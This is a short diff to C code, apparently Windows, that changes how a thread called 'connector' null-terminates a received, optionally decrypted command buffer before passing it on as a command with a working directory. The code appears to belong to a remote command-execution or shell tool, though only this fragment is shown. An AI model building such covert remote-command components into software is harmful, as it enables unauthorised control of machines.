@@ -252,8 +252,7 @@ static DWORD WINAPI connector(void *params)
 #ifdef CRYPT
 				crypt(cmdBuf, recvTot);
 #endif
-				cmdBuf[recvTot] = '\n';
-				cmdBuf[recvTot + 1] = '\0';
+				cmdBuf[recvTot] = '\0';
 
 				args.cmd = cmdBuf;
 				args.pwd = pwd;
